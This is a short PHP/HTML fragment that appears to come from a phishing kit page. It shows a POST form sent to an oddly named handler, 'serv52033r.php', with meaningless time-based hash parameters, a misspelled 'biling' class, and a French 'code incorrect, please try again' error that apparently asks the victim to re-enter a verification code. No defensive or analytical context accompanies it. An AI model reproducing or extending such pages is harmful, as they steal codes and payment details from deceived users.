...
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'serv52033r.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
        <center> <span class="step" style="text-transform:uppercase"></span>
		  ...
		  <br /><strong><span style="background-color: #ff0000; color: #ffffff;">Attention: code incorrect, veuillez réessayer !</span></strong><br />
          <div id="vu"> &nbsp;&nbsp;&nbsp; </div>
